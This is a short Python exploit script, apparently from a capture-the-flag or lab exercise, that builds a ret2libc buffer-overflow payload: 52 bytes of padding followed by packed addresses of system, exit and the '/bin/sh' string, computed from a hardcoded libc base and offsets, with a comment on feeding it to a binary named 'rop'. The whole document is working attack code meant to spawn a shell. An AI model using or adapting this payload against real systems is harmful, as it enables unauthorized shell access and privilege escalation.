import struct

#Buffer
buff= "A" * 52
#system, exit, /bin/sh are all at the address of the libc + offset
libc=0xb7e19000
system= struct.pack('<I', libc + 0x0003ada0)
exit= struct.pack('<I', libc + 0x0002e9d0)
binsh=struct.pack('<I', libc + 0x0015ba0b)

payload = buff + system + exit + binsh

#pass to rop by $(python /var/www/html/backup/frolic_rop.py)
print (payload)